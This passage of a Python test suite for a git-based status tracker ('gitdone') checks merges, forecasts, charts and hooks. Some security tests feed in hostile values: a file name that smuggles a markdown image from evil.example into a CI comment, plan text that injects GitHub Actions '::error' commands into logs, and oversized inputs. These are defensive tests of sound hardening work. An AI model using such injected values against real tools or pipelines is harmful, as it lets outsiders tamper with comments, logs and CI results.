        self.assertEqual(rows[1]["tests"], ["tests/test_export.py"])

    def test_t30_a_plans_paths_are_from_the_plans_folder(self):
        data = json.loads((self.one / ".gitdone.json").read_text())
        data["focus"] = {"paths": {"1": ["src/"]}}
        (self.one / ".gitdone.json").write_text(json.dumps(data))
        self.commit("2026-02-20", "Wire up the printer", files={"a/src/d.py": "1\n"}, table=False)
        found = focus.data(Plan(self.one / ".gitdone.json"), today=TODAY)
        self.assertEqual(found["on_plan"], 1)


class Next(Case):
    def test_t22_an_empty_workstream_is_passed_over(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "Empty", "rows": []}, {"id": "P2", "name": "Real", "rows": [1, 2]}], order=["P1", "P2"])
        self.write_table()
        found = focus.next_data(self.plan())
        self.assertEqual(found["workstream"]["id"], "P2")
        self.assertEqual([r["row"] for r in found["rows"]], [1, 2])

    def test_t22_eta_calls_it_no_rows(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "Empty", "rows": []}, {"id": "P2", "name": "Real", "rows": [1, 2]}], order=["P1", "P2"])
        self.write_table()
        self.commit("2026-01-01", "first")
        self.assertRegex(forecast.text(self.data()), r"P1 Empty\s+no rows")

    def test_it_does_not_call_a_later_row_a_change_of_scope(self):
        self.write_table()
        self.assertIn("Work on no row is a change of scope", focus.next_text(focus.next_data(self.plan())))


class TheActionsComment(Case):
    def base(self):
        self.write_table()
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "base")
        return git(self.repo, "rev-parse", "HEAD")

    def test_t23_a_file_name_cannot_write_markdown_into_the_comment(self):
        (self.repo / "spec.md").write_text("- REQ-1: words\n")
        self.write_plan(requirements=["x`\n\n![p](https://evil.example/p.png) @someone\n\n`/../spec.md"])
        base = self.base()
        lines = "\n".join(ci._when_and_scope(self.plan(), base))
        for line in lines.split("\n"):
            self.assertFalse(line.startswith("!["), line)
        self.assertNotIn("`\n", lines.split("**Requirements with no row:**")[-1].split(".")[0])

    def test_t24_a_change_to_what_was_asked_for_is_said_and_t47_is_not_judged(self):
        """It is not a change to the tracker, so a stale view elsewhere must not block it. What it did to the scope still has to be said."""
        (self.repo / "spec.md").write_text("- REQ-1: one\n")
        self.write_plan(requirements=["spec.md"])
        base = self.base()
        (self.repo / "spec.md").write_text("- REQ-1: one\n- REQ-2: two\n")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "spec: ask for more")
        self.assertFalse(ci.touched(self.plan(), base))
        out = io.StringIO()
        previous = os.getcwd()
        os.chdir(self.repo)
        self.addCleanup(os.chdir, previous)
        with contextlib.redirect_stdout(out):
            ci._say_focus(self.plan(), base)
        self.assertIn("requirements no row names", out.getvalue())

    def test_t36_a_moved_deadline_is_not_a_change_to_the_gates_rules(self):
        base = self.base()
        self.write_plan(deadline="2027-01-15")
        self.assertEqual(ci.rule_changes(self.plan(), base), [])
        self.assertIn("**Deadline:**", "\n".join(ci._when_and_scope(self.plan(), base)))

    def test_nothing_in_it_can_change_the_exit_code(self):
        self.write_plan(requirements=["\ud800.md"], focus={"upkeep": ["[z-a]"]})
        base = self.base()
        self.assertIsInstance(ci._when_and_scope(self.plan(), base), list)


class Shifts(Case):
    def test_add_says_both_lines_when_both_have_a_date(self):
        self.commit("2026-01-01", "first")
        for i, day in zip(range(1, 5), ("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20")):
            self.rows[i] = (f"Thing {i}", "Live")
            self.commit(day)
        before = forecast.left_now(self.plan())
        self.rows[11] = ("Thing 11", "Not built")
        self.write_table()
        words = forecast.shift_words(self.plan(), before, today=TODAY)
        self.assertIn("on Live rows alone,", words)
        self.assertIn("and with all work,", words)


class TheChart(unittest.TestCase):
    items = [{"date": "2026-02-01", "scope": 10, "strict": 0, "weighted": 0.0, "left": 10.0}, {"date": "2026-02-20", "scope": 10, "strict": 2, "weighted": 4.0, "left": 6.0}]

    def found(self, **keys):
        return {"as_of": "2026-03-01", "left": 6.0, "likely": "2026-04-01", "sure": "2026-04-20", "window_days": 28, "deadline": None, **keys}

    def test_t38_a_deadline_before_the_record_is_not_drawn_off_the_canvas(self):
        drawn = chart.burndown(self.items, "P", self.found(deadline={"date": "2025-01-01"}), "words")
        self.assertNotIn(">deadline</text>", drawn)
        self.assertIn("deadline", drawn)  # the panel still says it
        self.assertNotIn('x1="-', drawn)

    def test_an_85_percent_date_not_given_is_not_drawn_as_a_label(self):
        drawn = chart.burndown(self.items, "P", self.found(sure=None), "words")
        self.assertNotIn("85% sure", drawn)

    def test_a_live_date_is_in_the_panel_with_its_own_line(self):
        drawn = chart.burndown(self.items, "P", self.found(live={"kind": "Live", "left": 8, "likely": "2026-06-01"}), "words")
        self.assertIn("rows left, Live alone", drawn)
        self.assertEqual(drawn.count('stroke="var(--strict)" stroke-dasharray="6 5"'), 1)

    def test_a_kind_named_with_markup_cannot_write_it(self):
        drawn = chart.burndown(self.items, "P", self.found(live={"kind": "<b>", "left": 8, "likely": None}), "words")
        self.assertNotIn("<b>", drawn)


class RowNumbers(Case):
    def test_a_removed_row_never_gives_its_number_to_another(self):
        self.commit("2026-01-01", "first")
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "view")
        self.assertEqual(self.engine("remove", "10").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "gone")
        done = self.engine("add", "Something new")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("added row 11", done.stdout)

    def test_with_no_history_the_table_decides(self):
        delete_tree(self.repo / ".git")
        self.write_table()
        done = self.engine("add", "Something new")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("added row 11", done.stdout)


class TheEngineStillIsTheOnlyOneThatRuns(Case):
    def test_the_gates_answer_does_not_depend_on_any_of_this(self):
        self.write_table()
        self.write_plan(requirements=["a\u0000b.md"], focus={"upkeep": ["[z-a]"]}, deadline="2026-12-01")
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        self.assertEqual(self.engine("check", "--offline").returncode, 0)

    def test_gitio_is_what_runs_git(self):
        self.assertTrue(gitio.git(self.repo, "rev-parse", "--git-dir").out.strip())


class TheSecondAttack(Case):
    """What the fixes for the first attack broke or missed."""

    def rename_a_kind(self, kinds):
        self.write_plan(kinds=kinds)

    def test_t43_a_kind_renamed_in_the_plan_keeps_the_record(self):
        self.rows[12] = ("Thing 12", "Partial")
        self.commit("2026-01-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.rows[i] = (f"Thing {i}", "Live")
            self.commit(day)
        self.write_plan(kinds=[{"name": "Live", "weight": 1.0, "evidence": "release"}, {"name": "In progress", "weight": 0.4, "evidence": "note"}, {"name": "Not built", "weight": 0.0}])
        self.rows[12] = ("Thing 12", "In progress")
        self.commit("2026-02-25", "rename the kind")
        found = self.data()
        self.assertEqual(found["state"], "dated")
        self.assertEqual(found["moving_days"], 4)
        self.assertGreater(len(chart.points(self.plan(), today=TODAY.isoformat())), 4)

    def test_t44_a_wrong_count_in_a_heading_loses_nothing(self):
        self.commit("2026-01-01", "first")
        (self.repo / "status-table.md").write_text(table_text(self.rows).replace("(10)", "(9)"))
        self.commit("2026-02-03", "count off by one", table=False)
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            (self.repo / "status-table.md").write_text(table_text(self.rows).replace("(10)", "(9)"))
            self.commit(day, table=False)
        self.write_table()
        self.commit("2026-02-20", "fix the count", table=False)
        self.assertEqual(self.data()["moving_days"], 3)

    def test_t56_a_typo_in_one_row_does_not_move_the_credit_for_another(self):
        self.commit("2026-01-01", "first")
        self.rows[1] = ("Thing 1", "Live")
        self.rows[2] = ("Thing 2", "Parital")
        sha = self.commit("2026-02-20", "ship the export", files={"x.py": "1\n"})
        self.rows[2] = ("Thing 2", "Partial")
        self.commit("2026-02-25", "wire up the fax", files={"y.py": "1\n"})
        found = {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}
        self.assertEqual(found[sha[:7]]["class"], focus.ON)

    def test_t57_a_tool_that_fixes_the_committers_date_loses_no_days(self):
        self.commit("2026-01-01", "first", committer="2001-01-01")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            self.commit(day, committer="2001-01-01")
        self.assertEqual(self.data()["moving_days"], 3)

    def test_t58_a_table_moved_in_two_steps_keeps_its_life(self):
        self.commit("2025-01-01", "first")
        (self.repo / "docs").mkdir()
        shutil.copy(self.repo / "status-table.md", self.repo / "docs" / "status-table.md")
        self.commit("2026-02-20", "copy", table=False)
        (self.repo / "status-table.md").unlink()
        self.write_plan(status_doc="docs/status-table.md")
        self.commit("2026-02-21", "drop the old one", table=False)
        self.assertEqual(self.data()["window_days"], 28)

    def test_t4_a_rebase_onto_a_later_base_keeps_the_days_apart(self):
        self.commit("2026-01-01", "first")
        git(self.repo, "checkout", "-q", "-b", "f")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15"), start=1):
            self.rows[i] = (f"Thing {i}", "Partial")
            self.commit(day)
        git(self.repo, "checkout", "-q", "main")
        self.rows = {n: (f"Thing {n}", "Not built") for n in range(1, 11)}
        self.rows[10] = ("Thing 10", "Partial")
        self.commit("2026-02-24", "main side")
        git(self.repo, "checkout", "-q", "f")
        (self.repo / "status-table.md").write_text(table_text({**{n: (f"Thing {n}", "Not built") for n in range(1, 11)}, 1: ("Thing 1", "Partial"), 2: ("Thing 2", "Partial"), 3: ("Thing 3", "Partial")}))
        done = subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "rebase", "-q", "-X", "theirs", "main"],
                              env={**clean_env(), "GIT_COMMITTER_DATE": "2026-02-28T12:00:00"}, capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertGreaterEqual(self.data()["moving_days"], 3)

    def test_t14_both_clocks_wrong_on_one_commit_take_nothing_else_with_them(self):
        self.commit("2026-01-01", "first")
        self.rows[1] = ("Thing 1", "Partial")
        self.commit("2031-01-01", "m1", committer="2031-01-01")
        for i, day in zip((2, 3, 4), ("2026-02-08", "2026-02-15", "2026-02-22")):
            self.move(i, "Partial", day)
        self.assertGreaterEqual(self.data()["moving_days"], 3)

    def test_t16_rows_that_only_went_back_are_said_to(self):
        for n in range(1, 5):
            self.rows[n] = (f"Thing {n}", "Partial")
        self.commit("2026-01-01", "first")
        for n, day in zip((4, 3, 2, 1), ("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20")):
            self.move(n, "Not built", day)
        self.assertIn("only backwards", forecast.headline(self.data()))

    def test_t54_rows_reaching_live_from_an_equal_weight_get_their_date(self):
        self.write_plan(kinds=[{"name": "Live", "weight": 1.0, "evidence": "release"}, {"name": "Merged", "weight": 1.0}, {"name": "Todo", "weight": 0.0}])
        self.rows = {n: (f"Thing {n}", "Merged" if n < 4 else "Todo") for n in range(1, 7)}
        self.commit("2026-01-01", "first")
        for n, day in zip((1, 2, 3), ("2026-02-05", "2026-02-10", "2026-02-15")):
            self.move(n, "Live", day)
        found = self.data()
        self.assertEqual(found["state"], "dated")
        self.assertIn("on Live rows alone", forecast.headline(found))
        self.assertIn("no date: nothing moved by the weights", forecast.text(found))

    def test_t17_a_shallow_clone_has_no_time_bar_to_invent(self):
        self.write_plan(deadline="2026-12-01")
        self.steady()
        clone = self.tmp / "clone"
        git(self.tmp, "clone", "-q", "--depth", "1", f"file://{self.repo}", str(clone))
        found = forecast.data(Plan(clone / ".gitdone.json"), today=TODAY)
        self.assertIsNone(found["deadline"]["time_used"])
        self.assertNotIn("  Time", forecast.text(found))

    def test_t22_the_opener_passes_over_an_empty_workstream_too(self):
        self.write_plan(workstreams=[{"id": "P1", "name": "Empty", "rows": []}, {"id": "P2", "name": "Real", "rows": [1, 2]}], order=["P1", "P2"])
        self.write_table()
        plan = self.plan()
        from gitdone import render
        self.assertEqual(render.opener_data(plan, tables.load_clean(plan))["next"]["id"], "P2")

    def test_t41_the_same_file_named_a_thousand_times_is_read_once(self):
        self.write_table()
        (self.repo / "spec.md").write_text("- REQ-1: one\n")
        self.write_plan(requirements=["spec.md"] * 3000)
        self.assertEqual(self.plan().requirements, ["spec.md"])

    def test_t49_nothing_hidden_counts_as_nested(self):
        text = ("Intro words <!-- the old plan, dropped:\n- REQ-9: an idea we threw away\n-->\n\n- REQ-1: a real one\n\n      REQ-10: indented code under a list item\n\n"
                "- REQ-2: another\n    ```\n    REQ-11: in a nested fence\n    ```\n")
        self.assertEqual([i.ident for i in requirements.parse(text, "s.md")], ["REQ-1", "REQ-2"])

    def test_t18_a_sentence_that_starts_with_a_standard_is_a_sentence(self):
        text = "Storage follows the audit we passed under\nSOC-2. Everything else is out of scope.\nThe model we picked is\nGPT-4 - it was the cheapest at the time.\nOur contract says\nCR-7 — see the appendix.\n- IEEE-754 doubles everywhere\n- ECMA-262 only\n"
        self.assertEqual(requirements.parse(text, "s.md"), [])

    def test_t66_a_line_too_long_is_said(self):
        problems = []
        items = requirements.parse("- REQ-1: short\n- REQ-2: " + "very long words " * 150 + "\n- REQUIREMENT-1: a long prefix\n", "s.md", problems)
        self.assertEqual([i.ident for i in items], ["REQ-1", "REQUIREMENT-1"])
        self.assertIn("over 2000 characters", problems[0])

    def test_t68_no_words_ties_to_nothing(self):
        self.rows = {1: ("", "Not built")}
        (self.repo / "status-table.md").write_text("### 1. All (1)\n\n| # | Capability | Status | Note |\n|---|---|---|---|\n| 1 | Named | Not built | |\n")
        (self.repo / "spec.md").write_text("- REQ-1:\n")
        self.write_plan(requirements=["spec.md"])
        plan = self.plan()
        self.assertEqual(len(requirements.coverage(plan, tables.load_clean(plan))["without"]), 1)

    def test_t50_merging_main_into_a_branch_named_for_a_row_says_nothing_about_main(self):
        self.commit("2026-01-01", "first")
        git(self.repo, "checkout", "-q", "-b", "row-3-export")
        self.commit("2026-02-20", "row 3: export", files={"e.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        fax = self.commit("2026-02-21", "wire up the fax", files={"f.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "row-3-export")
        stamp = {"GIT_AUTHOR_DATE": "2026-02-22T12:00:00", "GIT_COMMITTER_DATE": "2026-02-22T12:00:00"}
        git(self.repo, "merge", "-q", "-m", "Merge branch 'main' into row-3-export", "main", env=stamp)
        git(self.repo, "checkout", "-q", "main")
        stamp = {"GIT_AUTHOR_DATE": "2026-02-23T12:00:00", "GIT_COMMITTER_DATE": "2026-02-23T12:00:00"}
        git(self.repo, "merge", "-q", "--no-ff", "-m", "Merge branch 'row-3-export'", "row-3-export", env=stamp)
        found = {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}
        self.assertEqual(found[fax[:7]]["class"], focus.OFF)

    def test_t51_a_number_the_table_never_read_as_a_row_is_not_a_row(self):
        (self.repo / "status-table.md").write_text("Example:\n\n```\n| 12345 | A row | Live | n |\n```\n\n" + table_text(self.rows))
        self.commit("2026-01-01", "first", table=False)
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        done = self.engine("add", "Something new")
        self.assertIn("added row 11", done.stdout)

    def test_t52_many_blank_lines_in_an_old_table_cost_nothing(self):
        self.commit("2026-01-01", "first")
        (self.repo / "status-table.md").write_text(table_text(self.rows) + "\n" * 300000)
        self.commit("2026-01-02", "blanks", table=False)
        self.commit("2026-01-03", "back")
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        began = time.monotonic()
        self.assertEqual(self.engine("add", "Something new").returncode, 0)
        self.assertLess(time.monotonic() - began, 15.0)

    def test_t53_a_long_heading_in_a_checklist_costs_nothing(self):
        from gitdone import scaffold
        began = time.monotonic()
        sections = scaffold.sections_from_checklist("# a" + " " * 80000 + "b\n- [ ] item\n")
        self.assertLess(time.monotonic() - began, 10.0)
        self.assertEqual(sum(len(s.rows) for s in sections), 1)

    def test_t59_week_from_a_commit_that_deleted_the_table(self):
        self.commit("2026-01-01", "first")
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "view", env={"GIT_AUTHOR_DATE": "2026-01-02T12:00:00", "GIT_COMMITTER_DATE": "2026-01-02T12:00:00"})
        kept = (self.repo / "status-table.md").read_text()
        (self.repo / "status-table.md").unlink()
        self.commit("2026-01-05", "drop", table=False)
        (self.repo / "status-table.md").write_text(kept)
        self.commit("2026-01-08", "back", table=False)
        from gitdone import history
        found = history.delta_data(self.plan(), since="2026-01-07", today=datetime.date(2026, 1, 9))
        self.assertEqual(found["moved"], [])

    def test_t62_a_row_in_a_domain_with_no_table_can_be_named(self):
        (self.repo / "status-table.md").write_text("### 1. Later (3)\n\nNothing yet.\n\n### 2. Now (2)\n\n| # | Name | Status | Note |\n|---|---|---|---|\n| 4 | T4 | Not built | n |\n| 5 | T5 | Not built | n |\n")
        self.commit("2026-01-01", "first", table=False)
        sha = self.commit("2026-02-25", "row 2: first cut", files={"w.py": "1\n"}, table=False)
        found = {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}
        self.assertEqual(found[sha[:7]]["class"], focus.ON)

    def test_t63_specs_under_any_folder_are_upkeep(self):
        self.commit("2026-01-01", "first")
        sha = self.commit("2026-02-25", "touch it", files={"pkg/specs/a.yml": "1\n"}, table=False)
        found = {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}
        self.assertEqual(found[sha[:7]]["class"], focus.UPKEEP)

    def test_t72_a_table_renamed_in_the_change_still_has_its_scope_said(self):
        self.commit("2026-01-01", "first")
        base = git(self.repo, "rev-parse", "HEAD")
        (self.repo / "docs").mkdir()
        git(self.repo, "mv", "status-table.md", "docs/status-table.md")
        self.write_plan(status_doc="docs/status-table.md")
        self.rows[11] = ("Thing 11", "Not built")
        (self.repo / "docs" / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-02-25", "move it, and add a row", table=False)
        self.assertEqual(forecast.against(self.plan(), base, today=TODAY)["added"], [11])

    def test_t30_a_plans_paths_are_from_its_folder_whatever_repo_says(self):
        project = self.repo / "proj"
        project.mkdir()
        self.plan_path.unlink()
        self.plan_path = project / ".gitdone.json"
        self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": "..", "default_branch": "main", "focus": {"paths": {"1": ["src/"]}}}))
        (project / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-01-01", "first", table=False)
        sha = self.commit("2026-02-25", "Wire up the printer", files={"proj/src/a.py": "1\n"}, table=False)
        found = {c["commit"]: c for c in focus.data(self.plan(), today=TODAY)["list"]}
        self.assertEqual(found[sha[:7]]["class"], focus.ON)


class TheHooksSecondAttack(Case):
    def setUp(self):
        super().setUp()
        needs_sh(self)
        self.plan_path.unlink()

    def real_commit(self, message, name):
        path = self.repo / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(message + "\n")
        git(self.repo, "add", "-A")
        return subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "commit", "-m", message],
                              env=clean_env(), capture_output=True, text=True)

    def project(self, name):
        folder = self.repo / name
        folder.mkdir()
        (folder / ".gitdone.json").write_text(json.dumps({"status_doc": "status-table.md", "repo": ".", "default_branch": "main"}))
        (folder / "status-table.md").write_text(table_text(self.rows))
        self.assertEqual(self.engine("render", "--write", cwd=folder).returncode, 0)
        return folder

    def test_t45_a_siblings_commit_says_nothing_about_an_old_one(self):
        one = self.project("proj")
        (self.repo / "other").mkdir()
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "begin")
        self.assertEqual(self.engine("install-hook", cwd=one).returncode, 0)
        self.assertIn("is off plan", (lambda d: d.stdout + d.stderr)(self.real_commit("Wire up the printer", "proj/f.py")))
        self.assertNotIn("is off plan", (lambda d: d.stdout + d.stderr)(self.real_commit("Other project work", "other/o.py")))

    def test_t46_one_hook_serves_every_tracker(self):
        one, two = self.project("a"), self.project("b")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "-m", "begin")
        self.assertEqual(self.engine("install-hook", cwd=one).returncode, 0)
        self.assertEqual(self.engine("install-hook", cwd=two).returncode, 0)
        self.assertIn("is off plan", (lambda d: d.stdout + d.stderr)(self.real_commit("Wire up in a", "a/f.py")))
        self.assertIn("is off plan", (lambda d: d.stdout + d.stderr)(self.real_commit("Wire up in b", "b/f.py")))


class WhatReachesALog(Case):
    def test_t5_a_plans_words_cannot_start_a_workflow_command(self):
        self.write_table()
        self.write_plan(status_out="x\n::error title=gitdone::the gate failed\ny.md")
        for command in (("check", "--offline"), ("render",)):
            done = self.engine(*command)
            for line in (done.stdout + done.stderr).split("\n"):
                self.assertFalse(line.lstrip().startswith("::"), line)

    def test_t5_a_group_label_cannot_start_a_line(self):
        self.write_table()
        self.write_plan(groups=[{"id": "a", "label": "A\n::error::from a group label", "domains": [1]}])
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        done = self.engine("opener")
        for line in done.stdout.split("\n"):
            self.assertFalse(line.startswith("::"), line)

    def test_ci_itself_still_speaks_to_the_runner(self):
        self.write_table()
        self.write_plan()
        event = self.tmp / "event.json"
        event.write_text("{}")
        (self.repo / "STATUS.md").write_text("stale\n")
        done = self.engine("ci", "--no-comment", env={"GITHUB_EVENT_PATH": str(event)})
        self.assertIn("::error", done.stdout)

    def test_t7_what_no_encoding_can_hold_does_not_crash_the_print(self):
        self.write_table()
        self.plan_path.write_text('{"status_doc": "status-table.md", "repo": ".", "requirements": ["\\ud800.md"]}')
        self.assertEqual(self.engine("render", "--write").returncode, 0)
        done = self.engine("check", "--offline")
        self.assertEqual(done.returncode, 0, done.stderr)

    def test_t48_a_mistake_in_a_signal_says_so_and_changes_no_exit_code(self):
        self.write_table()
        for keys in ({"focus": {"paths": {"P9": ["src/"]}}}, {"deadline": "soon"}, {"deadline": "2026-01-01", "start": "2026-06-01"}, {"focus": {"not_upkeep": "docs/*"}}, {"requirements": "spec.md"}, {"deadlin": "2026-01-01"}):
            with self.subTest(keys):
                self.write_plan(**keys)
                self.assertEqual(self.engine("render", "--write").returncode, 0)
                done = self.engine("check", "--offline")
                self.assertEqual(done.returncode, 0, done.stderr)
                self.assertIn("NOTE", done.stdout)


class TheThirdAttack(Case):
    """What a reader with no history of the first two attacks found: V1 to V23."""

    def spec(self, text, name="spec.md"):
        (self.repo / name).write_text(text)
        self.write_plan(requirements=[name])
        self.engine("render", "--write")

    def named(self, *names):
        self.rows = {i: (name, "Not built") for i, name in enumerate(names, 1)}

    def set_row(self, num, kind):
        self.rows[num] = (self.rows[num][0], kind)

    def judged(self, *args, **kwargs):
        return {c["subject"]: c for c in focus.data(self.plan(), days=60, today=datetime.date(2026, 3, 30), *args, **kwargs)["list"]}

    def merge_commit(self, *args, day="2026-03-10", message=None):
        env = {"GIT_AUTHOR_DATE": f"{day}T12:00:00", "GIT_COMMITTER_DATE": f"{day}T12:00:00"}
        git(self.repo, "merge", "-q", "--no-ff", *args, "-m", message or "Merge", env=env)

    # V1: the words a row must say
    def test_v1_a_number_or_a_verb_makes_it_another_requirement(self):
        self.named("Onboarding step 1", "Tax report for US", "Support API v2", "Add SMS login")
        self.write_table()
        self.spec("".join(f"- [ ] {words}\n" for words in ("Onboarding step 1", "Onboarding step 2", "Tax report for US", "Tax report for EU", "Support API v2", "Support API v3", "Remove SMS login")))
        found = requirements.coverage(self.plan(), tables.load_clean(self.plan()))
        self.assertEqual([item.words for item in found["without"]], ["Onboarding step 2", "Tax report for EU", "Support API v3", "Remove SMS login"])

    def test_v1_a_commit_named_on_a_checklist_item_is_not_one_of_its_words(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("- REQ-1: Sign in\n- [x] Export (abc1234)\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        self.assertEqual(requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"], [])

    def test_v1_it_is_still_a_suggestion(self):
        self.named("Add SMS login")
        self.write_table()
        self.spec("- [ ] Remove SMS login\n")
        found = requirements.coverage(self.plan(), tables.load_clean(self.plan()))
        self.assertEqual(found["without"][0].near.num, 1)

    def test_a_word_in_another_alphabet_is_a_word(self):
        self.assertEqual(focus.words_of("Войти по ссылке"), {"войти", "ссылке"})

    # V2: a merge
    def tip_and_merge(self):
        self.named("Magic link login", "Export to PDF")
        base = self.commit("2026-03-01", "tracker")
        self.engine("render", "--write")
        base = self.commit("2026-03-01", "view", table=False)
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.commit("2026-03-05", "Rewrite the printer driver", files={"printer.py": "1\n" * 700})
        self.commit("2026-03-06", "Try a new theme engine", files={"theme.py": "1\n" * 300})
        self.set_row(1, "Partial")
        self.commit("2026-03-06", "status: row 1 started")
        return base

    def test_v2_a_runs_own_merge_says_nothing_of_what_it_merged(self):
        base = self.tip_and_merge()
        at_the_tip = focus.data(self.plan(), revisions=f"{base}..HEAD", today=datetime.date(2026, 3, 30))
        tip = git(self.repo, "rev-parse", "HEAD")
        git(self.repo, "checkout", "-q", "--detach", base)
        self.merge_commit(tip, message=f"Merge {tip} into {base}")
        at_the_merge = focus.data(self.plan(), revisions=f"{base}..HEAD", today=datetime.date(2026, 3, 30))
        for key in ("on_plan", "unclear", "upkeep", "off_plan"):
            self.assertEqual(at_the_merge[key], at_the_tip[key], key)
        self.assertEqual(at_the_merge["off_plan"], 2)

    def test_v2_a_commit_that_moved_a_row_says_so_on_its_branch_and_inside_a_merge(self):
        self.named("Magic link login", "Export to PDF")
        base = self.commit("2026-03-01", "tracker")
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.set_row(1, "Partial")
        self.commit("2026-03-05", "Magic links go out", files={"link.py": "1\n"})
        before = self.judged(revisions=f"{base}..HEAD")["Magic links go out"]
        tip = git(self.repo, "rev-parse", "HEAD")
        git(self.repo, "checkout", "-q", "--detach", base)
        self.merge_commit(tip, message=f"Merge {tip} into {base}")
        after = self.judged(revisions=f"{base}..HEAD")["Magic links go out"]
        self.assertEqual((before["class"], after["class"]), (focus.ON, focus.ON))
        self.assertEqual(after["rows"], [1])

    def test_v2_main_merged_into_a_branch_stays_off_plan_there(self):
        self.named("Magic link login", "Export to PDF")
        self.commit("2026-03-01", "tracker")
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.commit("2026-03-05", "row 1: feature work", files={"f.py": "1\n"})
        git(self.repo, "checkout", "-q", "main")
        self.commit("2026-03-06", "Rewrite the printer driver", files={"printer.py": "1\n" * 400})
        self.set_row(2, "Partial")
        self.commit("2026-03-07", "status: row 2 started")
        git(self.repo, "checkout", "-q", "feature")
        self.merge_commit("main", message="Merge branch 'main' into feature")
        self.assertEqual(self.judged()["Rewrite the printer driver"]["class"], focus.OFF)
        git(self.repo, "checkout", "-q", "main")
        self.assertEqual(self.judged()["Rewrite the printer driver"]["class"], focus.OFF)

    def test_v2_a_table_moved_inside_a_merge_ties_the_move_and_not_all_that_came_with_it(self):
        self.named("Magic link login", "Export to PDF")
        self.commit("2026-03-01", "tracker")
        git(self.repo, "checkout", "-q", "-b", "develop")
        self.commit("2026-03-05", "Rewrite the printer driver", files={"printer.py": "1\n" * 700})
        self.set_row(1, "Partial")
        self.commit("2026-03-06", "status: row 1 started")
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("develop", message="Merge branch 'develop'")
        self.assertEqual(self.judged()["Rewrite the printer driver"]["class"], focus.OFF)

    def test_v2_a_merge_someone_named_for_a_row_still_brings_its_branch(self):
        self.named("Magic link login", "Export to PDF")
        self.commit("2026-03-01", "tracker")
        git(self.repo, "checkout", "-q", "-b", "row-1-links")
        self.commit("2026-03-05", "Send the link", files={"link.py": "1\n"})
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("row-1-links", message="Merge branch 'row-1-links'")
        self.assertEqual(self.judged()["Send the link"]["class"], focus.ON)

    def test_v2_a_pull_requests_run_knows_the_branch_its_checkout_has_lost(self):
        self.named("Magic link login", "Export to PDF")
        base = self.commit("2026-03-01", "tracker")
        git(self.repo, "checkout", "-q", "-b", "row-1-links")
        self.commit("2026-03-05", "Send the link", files={"link.py": "1\n"})
        self.assertEqual(self.judged(revisions=f"{base}..HEAD")["Send the link"]["class"], focus.UNCLEAR)
        tip = git(self.repo, "rev-parse", "HEAD")
        git(self.repo, "checkout", "-q", "--detach", base)
        self.merge_commit(tip, message=f"Merge {tip} into {base}")
        self.assertEqual(self.judged(revisions=f"{base}..HEAD")["Send the link"]["class"], focus.OFF)
        with unittest.mock.patch.dict(os.environ, {"GITHUB_HEAD_REF": "row-1-links"}):
            self.assertEqual(self.judged(revisions=f"{base}..HEAD")["Send the link"]["class"], focus.UNCLEAR)

    # V3 to V6: what a stranger's few bytes can ask for
    def test_v3_a_line_of_comments_costs_what_it_holds(self):
        started = time.monotonic()
        self.assertEqual(requirements.parse("- [ ] one\n" + "<!---->" * 600000 + "\n", "spec.md")[0].words, "one")
        self.assertLess(time.monotonic() - started, 8.0)

    def test_v3_what_a_comment_hides_is_still_hidden(self):
        lines = list(requirements.lines_to_read("a<!-- b -->c<!-- d\ne\nf -->g\n<!-- open\nnever\n"))
        self.assertEqual(lines, [(0, "ac"), (2, "g")])

    def test_v4_a_plan_cannot_ask_for_every_pattern_on_every_file(self):
        self.write_table()
        self.write_plan(focus={"upkeep": [f"x{i}/*" for i in range(3000)], "not_upkeep": ["y" * 300], "paths": {"1": [f"z{i}/" for i in range(3000)]}})
